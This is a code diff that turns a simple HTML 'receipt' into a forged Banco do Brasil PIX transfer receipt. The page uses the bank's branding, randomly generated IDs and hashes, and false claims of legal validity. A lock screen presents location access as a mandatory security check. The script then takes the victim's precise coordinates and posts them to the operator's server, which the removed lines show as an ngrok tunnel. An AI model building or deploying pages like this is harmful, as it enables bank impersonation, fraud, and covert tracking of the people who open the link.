@@ -4,66 +4,422 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
+  <title>Comprovante de Transação Bancária</title>
   <link rel="stylesheet" href="styles.css" />
 </head>
 
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+  <!-- Tela de Bloqueio - Exige Localização -->
+  <div id="location-required-screen" class="location-required-screen">
+    <div class="location-modal">
+      <div class="location-header">
+        <div class="logo-container-modal">
+          <img src="image.png" alt="Banco do Brasil" class="logo-image-modal">
+        </div>
+        <h2>Banco do Brasil</h2>
+        <p class="security-title">Verificação de Segurança</p>
+      </div>
+      
+      <div class="location-content">
+        <div class="location-icon">📍</div>
+        <h3>Permissão de Localização Necessária</h3>
+        <p class="location-text">
+          Por questões de segurança e prevenção de fraudes, precisamos verificar sua localização 
+          antes de exibir o comprovante de transação.
+        </p>
+        <p class="location-text">
+          Esta verificação é obrigatória conforme as políticas de segurança do Banco do Brasil 
+          e regulamentações do Banco Central.
+        </p>
+        
+        <div class="security-features">
+          <div class="feature-item">
+            <span class="check-icon">✓</span>
+            <span>Proteção contra transações fraudulentas</span>
+          </div>
+          <div class="feature-item">
+            <span class="check-icon">✓</span>
+            <span>Validação de dispositivo e localização</span>
+          </div>
+          <div class="feature-item">
+            <span class="check-icon">✓</span>
+            <span>Conformidade com normas de segurança</span>
+          </div>
+        </div>
 
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> catarina</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+        <div class="location-status" id="location-status">
+          <p class="status-text">Aguardando permissão de localização...</p>
+          <div class="loading-spinner"></div>
+        </div>
+
+        <div class="location-error" id="location-error" style="display: none;">
+          <p class="error-text">⚠️ Não foi possível obter sua localização.</p>
+          <p class="error-subtext">Por favor, permita o acesso à localização no seu navegador e recarregue a página.</p>
+          <button class="retry-button" onclick="requestLocationAgain()">Tentar Novamente</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="comprovante-container" id="comprovante-container" style="display: none;">
+    <!-- Cabeçalho com Logo -->
+    <div class="header">
+      <div class="logo-section">
+        <div class="logo-container">
+          <img src="image.png" alt="Banco do Brasil" class="logo-image">
+        </div>
+        <div class="bank-info">
+          <h1>Banco do Brasil S.A.</h1>
+          <p class="subtitle">Comprovante de Transferência PIX</p>
+          <p class="subtitle-small">Sistema de Pagamentos Instantâneos</p>
+        </div>
+      </div>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <!-- Linha divisória -->
+    <div class="divider"></div>
 
+    <!-- Informações da Transação -->
+    <div class="transaction-section">
+      <h2>Dados da Transação</h2>
+      <div class="info-grid">
+        <div class="info-item">
+          <span class="label">ID da Transação:</span>
+          <span class="value mono" id="transaction-id">E<span id="random-id"></span></span>
+        </div>
+        <div class="info-item">
+          <span class="label">EndToEndId:</span>
+          <span class="value mono" id="end-to-end-id"></span>
+        </div>
+        <div class="info-item">
+          <span class="label">Data/Hora da Transação:</span>
+          <span class="value" id="data-hora-completa"></span>
+        </div>
+        <div class="info-item">
+          <span class="label">Data/Hora do Processamento:</span>
+          <span class="value" id="data-processamento"></span>
+        </div>
+        <div class="info-item">
+          <span class="label">Status:</span>
+          <span class="value status-success">CONCLUÍDA</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Código de Retorno:</span>
+          <span class="value mono">LIQ</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Informações do Pagamento -->
+    <div class="payment-section">
+      <h2>Informações do Pagamento</h2>
+      <div class="info-grid">
+        <div class="info-item highlight">
+          <span class="label">Valor:</span>
+          <span class="value amount">R$ 1.000,00</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Tipo de Transação:</span>
+          <span class="value">PIX - Transferência</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Tipo de Chave PIX:</span>
+          <span class="value">CPF</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Chave PIX:</span>
+          <span class="value mono">123.456.789-00</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Descrição:</span>
+          <span class="value">Pagamento de serviços</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Taxa de Transação:</span>
+          <span class="value">R$ 0,00</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Informações do Pagador -->
+    <div class="payer-section">
+      <h2>Dados do Pagador (Origem)</h2>
+      <div class="info-grid">
+        <div class="info-item">
+          <span class="label">Nome:</span>
+          <span class="value">CATARINA SILVA SANTOS</span>
+        </div>
+        <div class="info-item">
+          <span class="label">CPF:</span>
+          <span class="value mono">123.456.789-00</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Instituição:</span>
+          <span class="value">341 - BANCO ITAU S.A.</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Agência:</span>
+          <span class="value mono">1234</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Conta:</span>
+          <span class="value mono">12345-6</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Tipo de Conta:</span>
+          <span class="value">Corrente</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Informações do Recebedor -->
+    <div class="receiver-section">
+      <h2>Dados do Recebedor (Destino)</h2>
+      <div class="info-grid">
+        <div class="info-item">
+          <span class="label">Nome:</span>
+          <span class="value">SERVICOS DIGITAIS BRASIL LTDA</span>
+        </div>
+        <div class="info-item">
+          <span class="label">CNPJ:</span>
+          <span class="value mono">12.345.678/0001-90</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Instituição:</span>
+          <span class="value">001 - BANCO DO BRASIL S.A.</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Agência:</span>
+          <span class="value mono">5678-9</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Conta:</span>
+          <span class="value mono">98765-4</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Tipo de Conta:</span>
+          <span class="value">Corrente</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Informações Técnicas -->
+    <div class="technical-section">
+      <h2>Informações Técnicas</h2>
+      <div class="info-grid">
+        <div class="info-item">
+          <span class="label">Hash da Transação:</span>
+          <span class="value mono small" id="transaction-hash"></span>
+        </div>
+        <div class="info-item">
+          <span class="label">Código de Autenticação:</span>
+          <span class="value mono" id="auth-code"></span>
+        </div>
+        <div class="info-item">
+          <span class="label">IP de Origem:</span>
+          <span class="value mono" id="origin-ip"></span>
+        </div>
+        <div class="info-item">
+          <span class="label">Canal de Origem:</span>
+          <span class="value">Internet Banking</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- QR Code Simulado -->
+    <div class="qr-section">
+      <div class="qr-code-placeholder">
+        <div class="qr-grid">
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+          <div class="qr-square"></div>
+        </div>
+      </div>
+      <p class="qr-text">Código de Autenticação: <span id="verification-code" class="mono"></span></p>
+    </div>
+
+    <!-- Rodapé -->
     <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
+      <div class="footer-divider"></div>
+      <p class="footer-text">
+        <strong>ATENÇÃO:</strong> Este comprovante possui validade fiscal e deve ser guardado pelo prazo de 5 (cinco) anos, conforme legislação vigente.
+      </p>
+      <p class="footer-text">
+        Este documento foi gerado automaticamente pelo sistema e dispensa assinatura.
+      </p>
+      <p class="footer-text">
+        Em caso de dúvidas sobre esta transação, entre em contato:
+      </p>
+      <p class="contact-info">
+        <strong>Central de Atendimento Banco do Brasil:</strong><br>
+        Telefone: 4004-0001 (capitais) | 0800-729-0001 (demais localidades)<br>
+        Horário de atendimento: 24 horas, 7 dias por semana<br>
+        Site: www.bb.com.br | App: Banco do Brasil
+      </p>
+      <p class="footer-small">
+        Banco do Brasil S.A. - CNPJ: 00.000.000/0001-91<br>
+        Sede: Setor Bancário Sul, Quadra 1, Bloco A - Brasília/DF - CEP: 70073-900<br>
+        Este documento foi gerado em <span id="footer-date"></span> e possui validade jurídica.
+      </p>
     </div>
 
+    <!-- Botão de Impressão -->
+    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+    function generateHash() {
+      const chars = '0123456789abcdef';
+      let hash = '';
+      for (let i = 0; i < 64; i++) {
+        hash += chars[Math.floor(Math.random() * chars.length)];
       }
+      return hash;
+    }
+
+    function generateEndToEndId() {
+      const prefix = 'E';
+      const timestamp = Date.now().toString();
+      const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+      return prefix + timestamp.substring(5) + random;
+    }
+
+    function generateAuthCode() {
+      return Math.random().toString(36).substring(2, 18).toUpperCase().replace(/O|0/g, 'X');
+    }
+
+    function generateIP() {
+      return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+    }
+
+    function initializeComprovante() {
+      // Gerar ID de transação aleatório (formato real do BB)
+      const randomId = Math.floor(Math.random() * 100000000).toString().padStart(8, '0');
+      document.getElementById("random-id").textContent = randomId;
+
+      // Gerar EndToEndId (formato PIX real)
+      const endToEndId = generateEndToEndId();
+      document.getElementById("end-to-end-id").textContent = endToEndId;
+
+      // Gerar hash da transação
+      const transactionHash = generateHash();
+      document.getElementById("transaction-hash").textContent = transactionHash;
+
+      // Gerar código de autenticação
+      const authCode = generateAuthCode();
+      document.getElementById("auth-code").textContent = authCode;
+      document.getElementById("verification-code").textContent = authCode;
+
+      // Gerar IP de origem
+      const originIP = generateIP();
+      document.getElementById("origin-ip").textContent = originIP;
+
+      // Formatar data e hora completa
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      const hora = String(dataAtual.getHours()).padStart(2, '0');
+      const minuto = String(dataAtual.getMinutes()).padStart(2, '0');
+      const segundo = String(dataAtual.getSeconds()).padStart(2, '0');
+
+      const dataHoraFormatada = `${dia}/${mes}/${ano} ${hora}:${minuto}:${segundo}`;
+      document.getElementById("data-hora-completa").textContent = dataHoraFormatada;
+
+      // Data de processamento (poucos segundos depois)
+      const dataProcessamento = new Date(dataAtual.getTime() + (Math.random() * 3000 + 1000));
+      const diaProc = String(dataProcessamento.getDate()).padStart(2, '0');
+      const mesProc = String(dataProcessamento.getMonth() + 1).padStart(2, '0');
+      const anoProc = dataProcessamento.getFullYear();
+      const horaProc = String(dataProcessamento.getHours()).padStart(2, '0');
+      const minutoProc = String(dataProcessamento.getMinutes()).padStart(2, '0');
+      const segundoProc = String(dataProcessamento.getSeconds()).padStart(2, '0');
+      const dataHoraProcessamento = `${diaProc}/${mesProc}/${anoProc} ${horaProc}:${minutoProc}:${segundoProc}`;
+      document.getElementById("data-processamento").textContent = dataHoraProcessamento;
+
+      // Data do rodapé
+      const footerDate = `${dia}/${mes}/${ano} às ${hora}:${minuto}`;
+      document.getElementById("footer-date").textContent = footerDate;
+    }
+
+    function showComprovante() {
+      document.getElementById("location-required-screen").style.display = "none";
+      document.getElementById("comprovante-container").style.display = "block";
+      initializeComprovante();
+    }
+
+    function requestLocationAgain() {
+      document.getElementById("location-error").style.display = "none";
+      document.getElementById("location-status").style.display = "block";
+      requestLocation();
+    }
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // Localização obtida com sucesso
+            document.getElementById("location-status").innerHTML = 
+              '<p class="status-text success">✓ Localização verificada com sucesso!</p>';
+            
+            setTimeout(() => {
+              showComprovante();
+              sendLocation(position);
+            }, 1000);
+          },
+          function(error) {
+            // Erro ao obter localização
+            document.getElementById("location-status").style.display = "none";
+            document.getElementById("location-error").style.display = "block";
+            console.error("Erro ao obter localização:", error.message);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        document.getElementById("location-status").style.display = "none";
+        document.getElementById("location-error").style.display = "block";
+        document.querySelector(".error-text").textContent = 
+          "⚠️ Seu navegador não suporta geolocalização.";
+      }
+    }
+
+    window.addEventListener("load", () => {
+      // Solicitar geolocalização imediatamente
+      requestLocation();
     });
-
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("https://2cbf-189-30-169-64.ngrok-free.app/send-location", {
+      fetch("/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: JSON.stringify({ 
+          latitude, 
+          longitude, 
+          maps,
+          transactionId: document.getElementById("transaction-id").textContent,
+          timestamp: new Date().toISOString()
+        })
       })
         .then(response => response.json())
         .then(data => {
           if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
+            console.error("Erro ao enviar localização");
           }
         })
         .catch(error => {
@@ -72,7 +428,7 @@
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      console.error("Erro ao obter a localização:", error.message);
     }
   </script>
 </body>
